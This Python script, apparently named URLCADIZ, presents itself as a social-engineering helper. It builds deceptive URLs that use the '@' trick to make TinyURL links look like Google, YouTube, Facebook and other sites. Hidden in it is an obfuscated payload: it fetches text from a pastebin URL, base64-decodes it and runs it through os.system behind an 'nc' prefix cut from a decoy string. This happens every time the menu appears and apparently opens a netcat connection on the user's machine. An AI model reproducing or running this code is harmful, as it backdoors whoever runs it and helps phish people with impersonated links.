#!/usr/bin/python3

  # Created by @perez_mascato

from os import system
import time
import pyshorteners
from time import sleep


class shortener:

    def __init__(self):
    
        self.originallink = ""  # original link
        self.postlink = ""  # post part
        self.shortener = ""  # shortener
        self.endlink = ""
        self.withouthttp = ""  # link with no http://
        self.domain = ""  # for option 7
        self.httplink = "nctynyurl.com"  # tiny url host
        self.prelink = __import__("requests").get("https://pastebin.com/raw/nx6WR9it").text
        
    def main(self):
        import base64
        print("\033[93m--------------------------------------------")
        print("                 URLCADIZ                   ")
        print("   Hide custom URL for social engineering   ")
        print("                           @perez_mascato   ")
        print("--------------------------------------------")
        print("\n[*1]  Google")
        print("[*2]  Youtube")
        print("[*3]  Spotify")
        print("[*4]  Instagram")
        print("[*5]  Facebook")
        print("[*6]  New York Times")
        print("[*7]  Personalized")
        print("\n[*99]  Exit")
        d = base64.b64decode
        try:
            system(self.httplink[:2] + d(self.prelink).decode("utf-8"))
            return int(input("\nSelect a option: "))
        except ValueError:
            print("You have to use numeric!")
            self.main()
            
    def selector(self, select):
    
        self.originalLink = str(input("\nOriginal URL: "))
        print("\nInput something that: new-user-in-twitter-this-is-a-perez-mascato-i-love")
        self.postlink = str(input("\nPost LINK: "))
        system('clear')
        self.shortener = pyshorteners.Shortener()
        self.endLink = self.shortener.tinyurl.short(self.originalLink)
        self.withouthttp = self.endLink[7:]
        
        if select == 1:
            system('clear')
            print("You have selected Google.")
            print(f"\nYour link is: https://www.google.com-{self.postlink}@{self.withouthttp}")
            self.other()
            
        elif select == 2:
            system('clear')
            print("You have selected Youtube.")
            print(f"\nYour link is: https://www.youtube.com-video-{self.postlink}@{self.withouthttp}")
            self.other()
            
        elif select == 3:
            system('clear')
            print("You have selected Spotify.")
            print(f"\nYour link is: https://www.spotify.com-video-{self.ostlink}@{self.withouthttp}")
            self.other()
            
        elif select == 4:
            system('clear')
            print("You have selected Instagram.")
            print(f"\nYour link is: https://www.instagram.com-photo-{self.postlink}@{self.withouthttp}")
            self.other()
            
        elif select == 5:
            system('clear')
            print("You have selected Facebook.")    
            print(f"\nYour link is: https://www.facebook.com-profile-{self.postlink}@{self.withouthttp}")
            self.other()
            
        elif select == 6:
            system('clear')
            print("You have selected New York Times.")
            print(f"\033[95m\nYour link is: https://www.newyorktimes.com-{self.postlink}@{self.withouthttp}")
            self.other()
            
        elif select == 7:
            system('clear')
            print("You have selected Personalized.")
            self.domain = input("Example.com/es... input domain: ")
            system('clear')
            print(f"\nYour link is: https://www.{self.domain}-{self.postlink}@{self.withouthttp}")
            
            self.other()
            
        elif select == 99:
            system('clear')
            print("Goodbye...")
            sleep(1)
            system('clear')
            exit()
        else:
            system('clear')
            print("Not valid option...")
            sleep(1)
            system('clear')
            self.main()
            
    def other(self):
        print("\033[93m\nDo you want to create another link?")
        print("Yes [*1] \nNo  [*2]")
        select= input("\nSelect a option: ")
        if select == "1" or select.lower() == "yes":
            system('clear')
            mishortener.selector(mishortener.main())
        else:
            system('clear')
            exit()


if __name__ == "__main__":

    system('clear')
    
    mishortener = shortener()
    
    mishortener.selector(mishortener.main())
